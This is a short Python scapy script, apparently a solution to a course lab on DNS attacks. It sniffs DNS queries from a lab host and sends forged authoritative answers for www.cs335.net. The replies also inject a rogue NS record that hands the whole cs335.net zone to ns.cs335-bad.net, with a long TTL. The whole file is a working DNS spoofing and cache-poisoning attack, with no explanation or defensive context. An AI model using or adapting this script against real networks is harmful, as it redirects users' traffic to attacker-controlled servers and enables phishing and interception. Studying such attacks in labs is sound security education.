#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
    if(DNS in pkt and 'www.cs335.net' in pkt[DNS].qd.qname):

        # Swap the source and destination IP address
        ip = IP(dst=pkt[IP].src,
                src=pkt[IP].dst)

        # Swap the source and destination port number
        udp = UDP(  dport=pkt[UDP].sport,
                    sport=pkt[UDP].dport)

        # The Answer Section
        ans = DNSRR(rrname=pkt[DNS].qd.qname,
                    type='A',
                    rdata='9.9.9.9',
                    ttl=199000)

        # The Authority Section (bad)
        ns = DNSRR( rrname="cs335.net",
                    type='NS',
                    rdata='ns.cs335-bad.net',
                    ttl=199000)

        # Construct the DNS packet
        dns = DNS(  id=pkt[DNS].id,
                    qd=pkt[DNS].qd,
                    aa=1,       # Authoritative Answer Flag
                    rd=0,       # Recursion Desired
                    qdcount=1,  # Question Count
                    qr=1,       # Query/Response Flag
                    ancount=1,  # Answer Record Count
                    nscount=1,  # Authority Record Count
                    an=ans,     # Answer Record
                    ns=ns)      # Authority Record

        # Construct the entire IP packet and send it out
        spoofpkt = ip/udp/dns
        send(spoofpkt)

        spoofpkt.show()

pkt=sniff(filter='udp and (src host 10.0.2.12 and dst port 53)', prn=spoof_dns)
